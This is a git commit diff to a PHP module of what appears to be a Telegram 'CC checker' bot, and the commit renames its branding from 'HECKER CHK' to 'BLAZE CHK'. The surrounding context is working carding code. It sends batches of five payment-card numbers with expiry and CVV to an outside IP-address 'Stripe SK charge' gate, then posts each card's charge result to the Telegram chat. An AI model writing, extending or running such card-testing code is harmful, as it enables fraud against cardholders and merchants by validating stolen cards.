3ad696b6491ef0e0d1b3fb72730338748a9794ac
BlazeOp <94062864+piroXpower@users.noreply.github.com>
2023-01-31 01:12:14 +0530

    Update mch.php

--- modules/mch.php
+++ modules/mch.php
@@ -43,7 +43,7 @@ $cvvz5 = multiexplode(array(":", "/", " ", "|"), $cc5)[3];
     exit();
     }
   else {
-  $sendmes = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=".$chatId."&text=<b>HECKER CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] STATUS: MASS CHECK INITIATED. WAIT...%0A━━━━━━━━━━━━━</b>&reply_to_message_id=".$message_id."&parse_mode=HTML";
+  $sendmes = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=".$chatId."&text=<b>BLAZE CHK ⚡️ - Status - $sat%0A━━━━━━━━━━━━━%0A[ϟ] STATUS: MASS CHECK INITIATED. WAIT...%0A━━━━━━━━━━━━━</b>&reply_to_message_id=".$message_id."&parse_mode=HTML";
   
     $sent = json_decode(file_get_contents($sendmes) ,1);
       $mes_id = $sent['result']['message_id'];
@@ -51,26 +51,26 @@ $cvvz5 = multiexplode(array(":", "/", " ", "|"), $cc5)[3];
   $r1 = file_get_contents('http://20.212.107.64/skbasedchk/gate/usd0.5.php?lista='.$lista1.'');
   $msg1 = trim(strip_tags(getStr($r1,' <br>Result:','</span><br>')));
   $ccr1 = "━━━━━━━━━━━━━%0A[ϟ] GATE: MASS STRIPE SK CHARGE %0A%0A[ϟ] 1st CC: <code>$lista1</code>%0A[ϟ] 1st CC RESULT: $msg1%0A━━━━━━━━━━━━━";
-  editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A$ccr1</b>",$mes_id);
+  editMessage($chatId, "<b>BLAZE CHK ⚡️ - Status - $sat%0A$ccr1</b>",$mes_id);
     $r2 = file_get_contents('http://20.212.107.64/skbasedchk/gate/usd0.5.php?lista='.$lista2.'');
   $msg2 = trim(strip_tags(getStr($r2,' <br>Result:','</span><br>')));
   $ccr2 = "[ϟ] 2nd CC: <code>$lista2</code>%0A[ϟ] 2nd CC RESULT: $msg2%0A━━━━━━━━━━━━━";
-  editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A$ccr1%0A$ccr2</b>",$mes_id);
+  editMessage($chatId, "<b>BLAZE CHK ⚡️ - Status - $sat%0A$ccr1%0A$ccr2</b>",$mes_id);
   $r3 = file_get_contents('http://20.212.107.64/skbasedchk/gate/usd0.5.php?lista='.$lista3.'');
   $msg3 = trim(strip_tags(getStr($r3,' <br>Result:','</span><br>')));
   $ccr3 = "[ϟ] 3rd CC: <code>$lista3</code>%0A[ϟ] 3rd CC RESULT: $msg3%0A━━━━━━━━━━━━━";
-  editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3</b>",$mes_id);
+  editMessage($chatId, "<b>BLAZE CHK ⚡️ - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3</b>",$mes_id);
     $r4 = file_get_contents('http://20.212.107.64/skbasedchk/gate/usd0.5.php?lista='.$lista4.'');
   $msg4 = trim(strip_tags(getStr($r4,' <br>Result:','</span><br>')));
   $ccr4 = "[ϟ] 4th CC: <code>$lista4</code>%0A[ϟ] 4th CC RESULT: $msg4%0A━━━━━━━━━━━━━";
-  editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4</b>",$mes_id);
+  editMessage($chatId, "<b>BLAZE CHK ⚡️ - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4</b>",$mes_id);
   $r5 = file_get_contents('http://20.212.107.64/skbasedchk/gate/usd0.5.php?lista='.$lista5.'');
   $msg5 = trim(strip_tags(getStr($r5,' <br>Result:','</span><br>')));
   $ccr5 = "[ϟ] 5th CC: <code>$lista5</code>%0A[ϟ] 5th CC RESULT: $msg5";
-  editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4%0A$ccr5</b>",$mes_id);
+  editMessage($chatId, "<b>BLAZE CHK ⚡️ - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4%0A$ccr5</b>",$mes_id);
     $time_end = microtime(true);
   $execution_time = ($time_end - $time_start);
-   editMessage($chatId, "<b>HECKER CHK ⚡️ - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4%0A$ccr5%0A━━━━━━━━━━━━━%0A[ϟ] 5 CARDS CHECKED!✅%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>",$mes_id);
+   editMessage($chatId, "<b>BLAZE CHK ⚡️ - Status - $sat%0A$ccr1%0A$ccr2%0A$ccr3%0A$ccr4%0A$ccr5%0A━━━━━━━━━━━━━%0A[ϟ] 5 CARDS CHECKED!✅%0A[ϟ] TIME TAKEN: $execution_time's%0A[ϟ] Checked By: @$username%0A[ϟ] UserID: $userId%0A[ϟ] Premium Activated: $stat%0A</b>",$mes_id);
 }
 }
 }
